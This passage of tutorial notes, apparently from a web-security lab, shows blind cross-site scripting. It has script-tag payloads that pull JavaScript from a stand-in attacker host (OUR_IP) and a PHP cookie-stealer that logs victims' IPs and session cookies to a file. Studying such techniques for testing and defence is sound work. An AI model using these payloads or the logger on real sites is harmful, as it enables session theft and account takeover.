**Loading a Remote Script**

Instead of placing JavaScript directly inside `<script>` tags, HTML can load JavaScript from another server.

Example:

```jsx
<script src="http://OUR_IP/script.js"></script>
```

You can also change the requested filename based on the field being tested.

Example:

```jsx
<script src="http://OUR_IP/username"></script>
```

If your server receives a request for:

```
/username
```

then the **username** field is vulnerable.

**Update the XSS Payload**

Change the earlier XSS payload so it loads:

```
script.js
```

instead:

```
<script src=http://OUR_IP/script.js></script>
```

Remember to replace OUR_IP in both: `script.js`  , the XSS payload.

Instead of only printing cookies to the terminal, create a PHP script that: Splits cookies., Writes them to a file. Save the following as index.php:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
